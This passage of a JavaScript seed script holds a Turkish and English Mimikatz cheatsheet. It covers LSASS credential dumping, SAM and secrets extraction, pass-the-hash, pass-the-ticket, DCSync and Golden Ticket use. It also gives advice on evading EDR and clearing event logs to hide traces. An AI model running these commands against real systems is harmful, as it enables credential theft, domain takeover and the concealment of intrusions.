import dbConnect from '../lib/dbConnect.js';
import Cheatsheet from '../models/Cheatsheet.js';
import Category from '../models/Category.js';
import mongoose from 'mongoose';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split(/\r?\n/);
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf('=');
        if (idx === -1) continue;
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (key && !(key in process.env)) process.env[key] = val;
    }
}

const contentTR = `# Mimikatz - Credential Extraction & Manipulation

## 1. Açıklama
**Mimikatz**, Windows işletim sistemlerinde hafızadan (LSASS process) plaintext parolaları, hash'leri, PIN kodlarını ve Kerberos biletlerini (tickets) çıkarmak için kullanılan, Benjamin Delpy tarafından geliştirilmiş efsanevi bir post-exploitation aracıdır. Pass-the-Hash, Pass-the-Ticket, Golden Ticket ve Silver Ticket saldırılarını gerçekleştirmek, token manipülasyonu ile yetki yükseltmek (privilege escalation) ve DPAPI/Crypto API üzerinden şifreli verileri çözmek için kullanılır. Red Team operasyonlarının vazgeçilmezidir.

## 2. Temel Komutlar ve Parametre Açıklamaları

### privilege::debug
\`\`\`bash
privilege::debug
\`\`\`
Mimikatz'ın sistem süreçlerine (özellikle LSASS) erişebilmesi için gerekli olan \`SeDebugPrivilege\` yetkisini aktifleştirir.
*   **Argüman Yok**: Bu komut argüman almaz.

### sekurlsa::logonpasswords
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
LSASS hafızasındaki tüm logon session'ları tarayarak plaintext parolaları ve NTLM hash'lerini döker.
*   **full**: (Opsiyonel) Daha detaylı çıktı verir.

### sekurlsa::minidump
\`\`\`bash
sekurlsa::minidump lsass.dmp
\`\`\`
Canlı sistem yerine, daha önce alınmış bir LSASS minidump dosyası üzerinde işlem yapılmasını sağlar (OPSEC-safe).
*   **lsass.dmp**: Analiz edilecek dump dosyasının yolu.

### lsadump::sam
\`\`\`bash
lsadump::sam
\`\`\`
Security Account Manager (SAM) veritabanından yerel kullanıcıların NTLM hash'lerini çeker.
*   **Argüman Yok**: Genellikle argümansız kullanılır (System yetkisi gerekir).

### lsadump::secrets
\`\`\`bash
lsadump::secrets
\`\`\`
LSA Secrets (servis hesapları, cachelenmiş credentiallar vb.) verilerini döker.
*   **Argüman Yok**: System yetkisi gerekir.

### kerberos::list
\`\`\`bash
kerberos::list
\`\`\`
Mevcut oturumdaki Kerberos biletlerini (TGT ve TGS) listeler.
*   **Argüman Yok**: Mevcut session'ı listeler.

### kerberos::ptt
\`\`\`bash
kerberos::ptt ticket.kirbi
\`\`\`
Pass-the-Ticket saldırısı. Harici bir Kerberos biletini mevcut oturuma enjekte eder.
*   **ticket.kirbi**: Enjekte edilecek bilet dosyası.

### token::elevate
\`\`\`bash
token::elevate
\`\`\`
Mevcut process'in token'ını SYSTEM veya Domain Admin yetkisine yükseltmeye çalışır (Impersonation).
*   **/id**: Hedef process ID (Opsiyonel).
*   **/domainadmin**: Domain Admin token'ı arar (Opsiyonel).

### event::clear
\`\`\`bash
event::clear
\`\`\`
Windows Event Loglarını temizler (Security, System, Application).
*   **Argüman Yok**: Tüm logları siler.

### dpapi::masterkey
\`\`\`bash
dpapi::masterkey /in:protected_file
\`\`\`
DPAPI ile korunmuş verileri çözmek için Master Key'i çıkarmaya veya kullanmaya yarar.
*   **/in**: Girdi dosyası.

## 3. Temel Kullanım

### LSASS Üzerinden Credential Extraction
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
\`\`\`
**Açıklama:**
Önce debug yetkisi alınır, ardından LSASS taranarak parolalar çekilir.

### SAM Dump
\`\`\`bash
token::elevate
lsadump::sam
\`\`\`
**Açıklama:**
SYSTEM yetkisine geçilir ve SAM veritabanı dump edilir.

### LSA Secrets Extraction
\`\`\`bash
privilege::debug
lsadump::secrets
\`\`\`
**Açıklama:**
Sistemdeki LSA secret verileri (servis şifreleri vb.) okunur.

### Kerberos Ticket Görüntüleme
\`\`\`bash
kerberos::list
\`\`\`
**Açıklama:**
Mevcut kullanıcının sahip olduğu TGT ve TGS biletlerini listeler.

### Token Manipulation
\`\`\`bash
token::list
token::elevate
\`\`\`
**Açıklama:**
Mevcut tokenları listeler ve yetki yükseltme (impersonation) dener.

### Privilege Escalation
\`\`\`bash
privilege::debug
token::elevate /id:500
\`\`\`
**Açıklama:**
Belirli bir process ID'sinin (örn: winlogon.exe) token'ını çalarak yetki yükseltir.

### WDigest Enable/Disable
\`\`\`bash
sekurlsa::wdigest
\`\`\`
**Açıklama:**
WDigest credentiallarını listeler (Windows 8.1+ sonrası registry ayarı gerektirir).

### MiniDump Üzerinden Offline Extraction
\`\`\`bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Açıklama:**
Canlı LSASS'a dokunmadan, dump dosyası üzerinden analiz yapar (Daha güvenli).

### Event Log Temizleme
\`\`\`bash
event::clear
\`\`\`
**Açıklama:**
İzleri silmek için olay günlüklerini temizler.

### DPAPI Credential Extraction
\`\`\`bash
dpapi::cred /in:blob.bin
\`\`\`
**Açıklama:**
DPAPI ile şifrelenmiş credential blob'unu çözer.

### Certificate Enumeration
\`\`\`bash
crypto::certificates /systemstore:local_machine
\`\`\`
**Açıklama:**
Sistemdeki sertifikaları listeler ve dışa aktarır.

### Pass-the-Hash Temel Mantığı
\`\`\`bash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH
\`\`\`
**Açıklama:**
Parola yerine NTLM hash kullanarak yeni bir process başlatır.

### Pass-the-Ticket Temel Mantığı
\`\`\`bash
kerberos::ptt administrator.kirbi
\`\`\`
**Açıklama:**
Çalınmış bir Kerberos biletini mevcut oturuma yükler.

## 4. İleri Seviye Kullanım

### PatchGuard Etkisinin Etrafından Dolaşma Mantığı
PatchGuard (Kernel Patch Protection), kernel seviyesindeki modifikasyonları engeller. Mimikatz, user-mode seviyesinde LSASS hafızasını okuyarak veya driver yükleyerek (mimidrv.sys) kernel korumalarını bypass etmeye çalışır ancak modern Windows sürümlerinde bu risklidir.

### sekurlsa::minidump ile Offline LSASS Analysis
Canlı sistemde Mimikatz çalıştırmak EDR tarafından engellenebilir. Bunun yerine Task Manager veya \`procdump\` ile LSASS dump'ı alınıp, bu dosya başka bir makinede Mimikatz ile analiz edilir. Bu en güvenli (OPSEC-safe) yöntemdir.

### Kerberos TGT/TGS Extraction Teknikleri
\`sekurlsa::tickets /export\` komutu ile hafızadaki tüm Kerberos biletleri .kirbi dosyası olarak diske yazılır. Bu biletler başka sistemlerde Pass-the-Ticket için kullanılabilir.

### Golden Ticket Üretimi
Domain'in KRBTGT hesabının NTLM hash'i ele geçirildiğinde, istenilen kullanıcı adına, istenilen yetkide ve sürede sahte bir TGT (Golden Ticket) üretilebilir. Bu bilet ile Domain Controller dahil her yere erişim sağlanır.

### Silver Ticket Mantığı
Belirli bir servisin (örn: SQL Server, CIFS) servis hesabının hash'i biliniyorsa, sadece o servis için geçerli sahte bir TGS (Silver Ticket) üretilir. KDC ile iletişim kurmadığı için tespiti zordur.

### Pass-the-Ticket Zinciri
Bir makineden çalınan TGT, başka bir makinede kullanılarak lateral movement yapılır. Bu işlem zincirleme devam ettirilerek Domain Admin'e kadar gidilebilir.

### Hybrid Attacks (DPAPI + Kerberos)
Kullanıcının DPAPI Master Key'i, Kerberos veya NTLM hash'i kullanılarak çözülebilir. Çözülen Master Key ile Chrome şifreleri, Wi-Fi profilleri gibi veriler decrypt edilir.

### Token Impersonation + Privilege Escalation Chaining
Düşük yetkili bir kullanıcıdan, SYSTEM yetkisine sahip bir servisin token'ı çalınır (Impersonation). Ardından bu yetki ile LSASS dump edilir veya Domain Admin token'ı aranır.

### OPSEC-Safe Mimikatz Kullanımı
Mimikatz binary'sini diske yazmadan (fileless) çalıştırmak (PowerShell, Cobalt Strike beacon) veya sadece dump dosyasını analiz etmek (offline) yakalanma riskini azaltır.

### AMSI/EDR Bypass Mantığı
AMSI (Antimalware Scan Interface), Mimikatz gibi araçların hafızada çalışmasını tarar. Bypass teknikleri genellikle AMSI DLL'ini patchleyerek veya hook'ları devre dışı bırakarak çalışır.

### LSASS Handle Safety
Mimikatz LSASS'a erişirken "OpenProcess" çağrısı yapar. EDR'lar bu çağrıyı izler. Handle duplication veya PssCaptureSnapshot gibi teknikler izlenmeyi zorlaştırır.

### DLL Injection Tabanlı Credential Enumeration
Mimikatz, kendi DLL'ini (mimilib.dll) hedef process'e enjekte ederek (örn: Winlogon) credential yakalayabilir (SSP injection).

### Domain Controller Üzerindeki Ek Extraction Vektörleri
DC üzerinde \`lsadump::dcsync\` komutu ile (Replication yetkisi varsa) tüm domain kullanıcılarının hash'leri uzaktan çekilebilir (DCSync Attack).

### Secure Boot Altındaki Limitasyonlar
Secure Boot ve Credential Guard aktifse, LSASS hafızası sanallaştırma tabanlı güvenlik (VBS) ile korunur. Mimikatz bu durumda plaintext parolaları okuyamaz, ancak NTLM hash'leri veya biletleri hala alabilir.

## 5. Açıklamalı Komutlar (GENİŞ LİSTE)

### Temel Extraction

**Komut:**
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
**Açıklama:**
Standart credential dump işlemi.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz (opsiyonel 'full' alabilir).

**Komut:**
\`\`\`bash
sekurlsa::wdigest
\`\`\`
**Açıklama:**
WDigest protokolü üzerinden credential arar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
sekurlsa::kerberos
\`\`\`
**Açıklama:**
Kerberos credentiallarını (keytab, session keys) arar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
sekurlsa::tspkg
\`\`\`
**Açıklama:**
TsPkg (Terminal Services) credentiallarını arar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
sekurlsa::livessp
\`\`\`
**Açıklama:**
LiveSSP credentiallarını arar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
sekurlsa::minidump lsass.dmp
\`\`\`
**Açıklama:**
Dump dosyası bağlar.
**Argüman Açıklamaları:**
*   **lsass.dmp**: Dosya yolu.

**Komut:**
\`\`\`bash
sekurlsa::msv
\`\`\`
**Açıklama:**
MSV1_0 (NTLM) credentiallarını arar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

### LSA/SAM/Secrets

**Komut:**
\`\`\`bash
lsadump::sam
\`\`\`
**Açıklama:**
SAM veritabanını dump eder.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
lsadump::lsa
\`\`\`
**Açıklama:**
LSA verilerini dump eder.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
lsadump::secrets
\`\`\`
**Açıklama:**
LSA Secrets verilerini dump eder.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
lsadump::cache
\`\`\`
**Açıklama:**
MSCASH (Domain Cached Credentials) hashlerini döker.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
lsadump::trust
\`\`\`
**Açıklama:**
Domain trust bilgilerini ve şifrelerini döker.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

### Kerberos

**Komut:**
\`\`\`bash
kerberos::tgt
\`\`\`
**Açıklama:**
Mevcut TGT biletini gösterir.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
kerberos::list
\`\`\`
**Açıklama:**
Tüm biletleri listeler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
kerberos::ptt ticket.kirbi
\`\`\`
**Açıklama:**
Bilet enjekte eder.
**Argüman Açıklamaları:**
*   **ticket.kirbi**: Bilet dosyası.

**Komut:**
\`\`\`bash
kerberos::purge
\`\`\`
**Açıklama:**
Mevcut biletleri siler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
kerberos::hash
\`\`\`
**Açıklama:**
Parolayı hash'e çevirir.
**Argüman Açıklamaları:**
*   **/password**: Parola.

### Token Manipulation

**Komut:**
\`\`\`bash
token::list
\`\`\`
**Açıklama:**
Tokenları listeler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
token::elevate
\`\`\`
**Açıklama:**
Yetki yükseltir (SYSTEM).
**Argüman Açıklamaları:**
*   Bu komut argüman almaz (veya /id, /domainadmin).

**Komut:**
\`\`\`bash
token::impersonate
\`\`\`
**Açıklama:**
Belirli bir token'ı taklit eder.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz (genellikle parametre ile kullanılır).

### DPAPI

**Komut:**
\`\`\`bash
dpapi::masterkey
\`\`\`
**Açıklama:**
Master Key bilgilerini gösterir.
**Argüman Açıklamaları:**
*   **/in**: Dosya yolu.

**Komut:**
\`\`\`bash
dpapi::cred
\`\`\`
**Açıklama:**
Credential blob çözer.
**Argüman Açıklamaları:**
*   **/in**: Blob dosyası.

**Komut:**
\`\`\`bash
dpapi::wi
\`\`\`
**Açıklama:**
Wi-Fi profillerini çözer.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
dpapi::blob
\`\`\`
**Açıklama:**
Herhangi bir DPAPI blob'unu çözer.
**Argüman Açıklamaları:**
*   **/in**: Blob verisi.

### Crypto

**Komut:**
\`\`\`bash
crypto::certificates
\`\`\`
**Açıklama:**
Sertifikaları listeler.
**Argüman Açıklamaları:**
*   **/systemstore**: Store adı (local_machine vb.).

**Komut:**
\`\`\`bash
crypto::keys
\`\`\`
**Açıklama:**
Anahtarları listeler.
**Argüman Açıklamaları:**
*   **/systemstore**: Store adı.

**Komut:**
\`\`\`bash
crypto::capi
\`\`\`
**Açıklama:**
CryptoAPI patch (Exportable olmayan anahtarları export etmek için).
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
crypto::sc
\`\`\`
**Açıklama:**
Smart Card işlemleri.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

### Misc

**Komut:**
\`\`\`bash
event::clear
\`\`\`
**Açıklama:**
Logları temizler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
process::list
\`\`\`
**Açıklama:**
Çalışan süreçleri listeler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
process::imports
\`\`\`
**Açıklama:**
Process importlarını listeler.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
!+
\`\`\`
**Açıklama:**
Mimikatz logosunu/efektini açar.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

**Komut:**
\`\`\`bash
!-
\`\`\`
**Açıklama:**
Mimikatz logosunu/efektini kapatır.
**Argüman Açıklamaları:**
*   Bu komut argüman almaz.

## 6. Gerçek Pentest Senaryoları

### Local Admin ile Credential Extraction
**Teknik Açıklama:**
Yerel yönetici yetkisiyle LSASS hafızasından parolaları çekme.
**Komutlar:**
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
\`\`\`
**Argüman Açıklamaları:**
*   **privilege::debug**: Debug yetkisi alır.
*   **sekurlsa::logonpasswords**: Parolaları döker.

### Domain User ile Limited Credential Enum
**Teknik Açıklama:**
Düşük yetkili kullanıcı ile kendi Kerberos biletlerini listeleme.
**Komutlar:**
\`\`\`bash
kerberos::list
\`\`\`
**Argüman Açıklamaları:**
*   **kerberos::list**: Biletleri gösterir.

### DC Üzerinde SAM + LSA + Secrets Zincirleme Extraction
**Teknik Açıklama:**
Domain Controller üzerinde tüm yerel ve domain secretlarını toplama.
**Komutlar:**
\`\`\`bash
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
lsadump::lsa
\`\`\`
**Argüman Açıklamaları:**
*   **token::elevate**: SYSTEM yetkisine geçer.
*   **lsadump::***: İlgili veritabanlarını döker.

### LSASS Minidump Yöntemi ile Offline Credential Toplama
**Teknik Açıklama:**
EDR'ı atlatmak için dump dosyasını başka makinede analiz etme.
**Komutlar:**
\`\`\`bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Argüman Açıklamaları:**
*   **sekurlsa::minidump**: Dump dosyasını yükler.

### Kerberos Ticket Extraction → Pass-the-Ticket
**Teknik Açıklama:**
Hafızadaki biletleri dışarı aktarıp başka oturuma enjekte etme.
**Komutlar:**
\`\`\`bash
sekurlsa::tickets /export
kerberos::ptt [0;3e7]-2-0-60a00000-Admin@krbtgt-DOMAIN.kirbi
\`\`\`
**Argüman Açıklamaları:**
*   **/export**: Biletleri diske yazar.
*   **kerberos::ptt**: Bileti yükler.

### Token Impersonation ile Privilege Escalation
**Teknik Açıklama:**
SYSTEM yetkisindeki bir process'in token'ını çalma.
**Komutlar:**
\`\`\`bash
privilege::debug
token::list
token::elevate /id:500
\`\`\`
**Argüman Açıklamaları:**
*   **/id**: Hedef process ID.

### EDR Engellemesinde OPSEC-Safe Kullanım
**Teknik Açıklama:**
Mimikatz'ı doğrudan çalıştırmak yerine procdump kullanma.
**Komutlar:**
\`\`\`bash
# (Cmd üzerinde) procdump.exe -ma lsass.exe lsass.dmp
# (Mimikatz üzerinde)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Argüman Açıklamaları:**
*   **-ma**: Full memory dump (Procdump parametresi).

### WDigest Force-Enable → Credential Exposure Analizi
**Teknik Açıklama:**
WDigest'i registry'den açıp (yeniden başlatma sonrası) plaintext parola yakalama.
**Komutlar:**
\`\`\`bash
# Registry değişikliği gerekir (Reg add ...)
sekurlsa::wdigest
\`\`\`
**Argüman Açıklamaları:**
*   **sekurlsa::wdigest**: WDigest verilerini okur.

### DPAPI Credential Extraction ile Chrome/Edge Şifre Çözme
**Teknik Açıklama:**
Tarayıcı şifrelerini çözmek için Master Key kullanma.
**Komutlar:**
\`\`\`bash
dpapi::masterkey /in:"%APPDATA%\\Microsoft\\Protect\\SID\\GUID"
dpapi::chrome /in:"Login Data"
\`\`\`
**Argüman Açıklamaları:**
*   **/in**: İlgili dosya yolu.

### Domain Trust Relationship Analizinde lsadump::trust
**Teknik Açıklama:**
Forest/Domain trust şifrelerini görüntüleme.
**Komutlar:**
\`\`\`bash
privilege::debug
lsadump::trust
\`\`\`
**Argüman Açıklamaları:**
*   **lsadump::trust**: Trust bilgilerini döker.

### Event Log Temizleme + OPSEC Zinciri
**Teknik Açıklama:**
İşlem bittikten sonra logları silme.
**Komutlar:**
\`\`\`bash
event::clear
\`\`\`
**Argüman Açıklamaları:**
*   **event::clear**: Logları siler.

### RDP ile Privilege Escalation Sonrası Extraction
**Teknik Açıklama:**
RDP oturumunda TsPkg credentiallarını okuma.
**Komutlar:**
\`\`\`bash
privilege::debug
sekurlsa::tspkg
\`\`\`
**Argüman Açıklamaları:**
*   **sekurlsa::tspkg**: RDP credentiallarını okur.

### Silver Ticket İçin Gerekli Hash Bilgisi Toplama
**Teknik Açıklama:**
Servis hesabının NTLM hash'ini alma.
**Komutlar:**
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
# Veya
lsadump::secrets
\`\`\`
**Argüman Açıklamaları:**
*   Komutlar standarttır, çıktıdan hash alınır.

### TGS Pass-Through Testleri
**Teknik Açıklama:**
Mevcut TGS ile servise erişim testi.
**Komutlar:**
\`\`\`bash
kerberos::list
# (Windows cmd) dir \\\\target\\c$
\`\`\`
**Argüman Açıklamaları:**
*   **kerberos::list**: Bileti doğrular.

### Multi-Hop Saldırıda Token Delegation
**Teknik Açıklama:**
Delegation token'larını listeleme ve kullanma.
**Komutlar:**
\`\`\`bash
token::list
token::impersonate
\`\`\`
**Argüman Açıklamaları:**
*   **token::impersonate**: Token'ı taklit eder.

### Service Account Credential Discovery
**Teknik Açıklama:**
LSA Secrets içindeki servis hesaplarını bulma.
**Komutlar:**
\`\`\`bash
privilege::debug
lsadump::secrets
\`\`\`
**Argüman Açıklamaları:**
*   **lsadump::secrets**: Servis şifrelerini gösterir.

### Domain Lateral Movement Öncesi Info Gathering
**Teknik Açıklama:**
Hangi kullanıcıların oturum açtığını görme.
**Komutlar:**
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
**Argüman Açıklamaları:**
*   Çıktıdaki "User Name" ve "Domain" alanları analiz edilir.

## 7. Best Practices (Uzman Seviye)

*   **LSASS’a direkt işlem yapmak yerine minidump tercih et**: EDR tespitinden kaçınmak için en temel kuraldır.
*   **Domain ortamında OPSEC için sekurlsa değil minidump kullan**: Canlı sistemde bellek okumak risklidir.
*   **Token impersonation sonrası işlem chain analizini iyi yönet**: Hangi yetkide olduğunuzu \`whoami\` veya \`token::whoami\` ile sürekli kontrol edin.
*   **DPAPI verilerini offline çözümlemek daha güvenli**: Blob dosyalarını alıp kendi makinenizde çözün.
*   **Kerberos bileşenlerinde purge işlemi sonrası iz kalmaz**: \`kerberos::purge\` ile eski biletleri temizleyin.
*   **Debug privilege açılmadan extraction çalışmaz**: Her zaman önce \`privilege::debug\` çalıştırın.
*   **Credential’ları her zaman offline analiz için sakla**: Çıktıları log dosyasına (\`/log\`) kaydedin.
*   **TGT/TGS işlemlerini farklı host’larda yürüt**: Bilet üretimini ve kullanımını ayırın.
*   **Golden Ticket üretimi sonrası logları temizle**: DC üzerindeki logları temizlemeyi unutmayın.

## 8. Sık Yapılan Hatalar

*   **Debug privilege aktifleştirmeden extraction denemek**: "Handle invalid" hatası alırsınız.
*   **LSASS üzerinde canlı çalışarak EDR tetiklemek**: Defender veya Sentinel anında yakalar.
*   **Wrong ticket injection (yanlış realm/domain)**: Bilet üretirken domain adını yanlış yazmak.
*   **Minidump dosyasını bozuk almak**: Dump işlemi bitmeden dosyayı kopyalamaya çalışmak.
*   **Token elevation sonrası context kontrol etmemek**: SYSTEM olduğunuzu sanıp hala User yetkisinde kalmak.
*   **DPAPI blob’larını user context dışında çözmeye çalışmak**: Kullanıcı verisini SYSTEM yetkisiyle çözemezsiniz (Master Key erişimi hariç).
*   **Kerberos purge yapmadan yeni ticket denemek**: Eski bilet öncelikli olabilir, çakışma yaratır.
*   **SAM ve LSA dump’ını karıştırmak**: SAM yerel kullanıcılar, LSA domain/servis secretları içindir.
*   **WDigest disable durumunu unutarak plaintext beklemek**: Modern Windows'ta varsayılan kapalıdır, null gelir.
`;

const contentEN = `# Mimikatz - Credential Extraction & Manipulation

## 1. Description
**Mimikatz** is a legendary post-exploitation tool developed by Benjamin Delpy, used to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory (LSASS process) on Windows operating systems. It is essential for Red Team operations to perform Pass-the-Hash, Pass-the-Ticket, Golden Ticket, and Silver Ticket attacks, escalate privileges via token manipulation, and decrypt data protected by DPAPI/Crypto API.

## 2. Basic Commands and Parameter Descriptions

### privilege::debug
\`\`\`bash
privilege::debug
\`\`\`
Enables the \`SeDebugPrivilege\` required for Mimikatz to access system processes (especially LSASS).
*   **No Arguments**: This command takes no arguments.

### sekurlsa::logonpasswords
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
Scans all logon sessions in LSASS memory and dumps plaintext passwords and NTLM hashes.
*   **full**: (Optional) Provides more detailed output.

### sekurlsa::minidump
\`\`\`bash
sekurlsa::minidump lsass.dmp
\`\`\`
Allows processing on a previously acquired LSASS minidump file instead of the live system (OPSEC-safe).
*   **lsass.dmp**: Path to the dump file to be analyzed.

### lsadump::sam
\`\`\`bash
lsadump::sam
\`\`\`
Retrieves NTLM hashes of local users from the Security Account Manager (SAM) database.
*   **No Arguments**: Usually used without arguments (Requires System privileges).

### lsadump::secrets
\`\`\`bash
lsadump::secrets
\`\`\`
Dumps LSA Secrets data (service accounts, cached credentials, etc.).
*   **No Arguments**: Requires System privileges.

### kerberos::list
\`\`\`bash
kerberos::list
\`\`\`
Lists Kerberos tickets (TGT and TGS) in the current session.
*   **No Arguments**: Lists current session.

### kerberos::ptt
\`\`\`bash
kerberos::ptt ticket.kirbi
\`\`\`
Pass-the-Ticket attack. Injects an external Kerberos ticket into the current session.
*   **ticket.kirbi**: Ticket file to inject.

### token::elevate
\`\`\`bash
token::elevate
\`\`\`
Attempts to elevate the current process token to SYSTEM or Domain Admin privileges (Impersonation).
*   **/id**: Target process ID (Optional).
*   **/domainadmin**: Searches for Domain Admin token (Optional).

### event::clear
\`\`\`bash
event::clear
\`\`\`
Clears Windows Event Logs (Security, System, Application).
*   **No Arguments**: Deletes all logs.

### dpapi::masterkey
\`\`\`bash
dpapi::masterkey /in:protected_file
\`\`\`
Used to extract or use the Master Key to decrypt DPAPI-protected data.
*   **/in**: Input file.

## 3. Basic Usage

### Credential Extraction via LSASS
\`\`\`bash
privilege::debug
sekurlsa::logonpasswords
\`\`\`
**Description:**
First debug privilege is obtained, then LSASS is scanned to extract passwords.

### SAM Dump
\`\`\`bash
token::elevate
lsadump::sam
\`\`\`
**Description:**
Escalate to SYSTEM and dump SAM database.

### LSA Secrets Extraction
\`\`\`bash
privilege::debug
lsadump::secrets
\`\`\`
**Description:**
Read system LSA secret data (service passwords, etc.).

### Viewing Kerberos Tickets
\`\`\`bash
kerberos::list
\`\`\`
**Description:**
Lists TGT and TGS tickets owned by the current user.

### Token Manipulation
\`\`\`bash
token::list
token::elevate
\`\`\`
**Description:**
Lists current tokens and attempts privilege escalation (impersonation).

### Privilege Escalation
\`\`\`bash
privilege::debug
token::elevate /id:500
\`\`\`
**Description:**
Escalates privileges by stealing the token of a specific process ID (e.g., winlogon.exe).

### WDigest Enable/Disable
\`\`\`bash
sekurlsa::wdigest
\`\`\`
**Description:**
Lists WDigest credentials (requires registry setting on Windows 8.1+).

### Offline Extraction via MiniDump
\`\`\`bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
\`\`\`
**Description:**
Analyzes via dump file without touching live LSASS (Safer).

### Clearing Event Logs
\`\`\`bash
event::clear
\`\`\`
**Description:**
Clears event logs to remove traces.

### DPAPI Credential Extraction
\`\`\`bash
dpapi::cred /in:blob.bin
\`\`\`
**Description:**
Decrypts a DPAPI encrypted credential blob.

### Certificate Enumeration
\`\`\`bash
crypto::certificates /systemstore:local_machine
\`\`\`
**Description:**
Lists and exports certificates from the system.

### Pass-the-Hash Basic Logic
\`\`\`bash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH
\`\`\`
**Description:**
Starts a new process using NTLM hash instead of password.

### Pass-the-Ticket Basic Logic
\`\`\`bash
kerberos::ptt administrator.kirbi
\`\`\`
**Description:**
Loads a stolen Kerberos ticket into the current session.

## 4. Advanced Usage

### PatchGuard Bypass Logic
PatchGuard (Kernel Patch Protection) prevents kernel-level modifications. Mimikatz attempts to bypass kernel protections by reading LSASS memory at user-mode level or loading a driver (mimidrv.sys), but this is risky on modern Windows versions.

### Offline LSASS Analysis with sekurlsa::minidump
Running Mimikatz on a live system can be blocked by EDR. Instead, take an LSASS dump using Task Manager or \`procdump\` and analyze this file with Mimikatz on another machine. This is the safest (OPSEC-safe) method.

### Kerberos TGT/TGS Extraction Techniques
Using \`sekurlsa::tickets /export\`, all Kerberos tickets in memory are written to disk as .kirbi files. These tickets can be used for Pass-the-Ticket on other systems.

### Golden Ticket Generation
If the NTLM hash of the Domain's KRBTGT account is compromised, a fake TGT (Golden Ticket) can be generated for any user, with any privilege and duration. This ticket provides access everywhere, including the Domain Controller.

### Silver Ticket Logic
If the hash of a service account (e.g., SQL Server, CIFS) is known, a fake TGS (Silver Ticket) valid only for that service can be generated. It is hard to detect as it does not communicate with the KDC.

### Pass-the-Ticket Chaining
A TGT stolen from one machine is used on another to perform lateral movement. This process can be chained to reach Domain Admin.

### Hybrid Attacks (DPAPI + Kerberos)
The user's DPAPI Master Key can be decrypted using Kerberos or NTLM hash. The decrypted Master Key is used to decrypt data like Chrome passwords, Wi-Fi profiles.

### Token Impersonation + Privilege Escalation Chaining
Steal the token of a SYSTEM privileged service from a low-privileged user (Impersonation). Then use this privilege to dump LSASS or hunt for Domain Admin tokens.

### OPSEC-Safe Mimikatz Usage
Running Mimikatz binary without writing to disk (fileless) (PowerShell, Cobalt Strike beacon) or analyzing only the dump file (offline) reduces the risk of detection.

### AMSI/EDR Bypass Logic
AMSI (Antimalware Scan Interface) scans tools like Mimikatz running in memory. Bypass techniques usually work by patching the AMSI DLL or disabling hooks.

### LSASS Handle Safety
Mimikatz calls "OpenProcess" when accessing LSASS. EDRs monitor this call. Techniques like Handle duplication or PssCaptureSnapshot make monitoring difficult.

### DLL Injection Based Credential Enumeration
Mimikatz can inject its own DLL (mimilib.dll) into the target process (e.g., Winlogon) to capture credentials (SSP injection).

### Additional Extraction Vectors on Domain Controller
On a DC, using \`lsadump::dcsync\` (if Replication privilege exists), hashes of all domain users can be pulled remotely (DCSync Attack).

### Limitations under Secure Boot
If Secure Boot and Credential Guard are active, LSASS memory is protected by Virtualization-Based Security (VBS). Mimikatz cannot read plaintext passwords in this case, but can still retrieve NTLM hashes or tickets.

## 5. Annotated Commands (EXTENSIVE LIST)

### Basic Extraction

**Command:**
\`\`\`bash
sekurlsa::logonpasswords
\`\`\`
**Description:**
Standard credential dump operation.
**Argument Explanations:**
*   This command takes no arguments (can take optional 'full').

**Command:**
\`\`\`bash
sekurlsa::wdigest
\`\`\`
**Description:**
Searches for credentials via WDigest protocol.
**Argument Explanations:**
*   This command takes no arguments.

**Command:**
\`\`\`bash
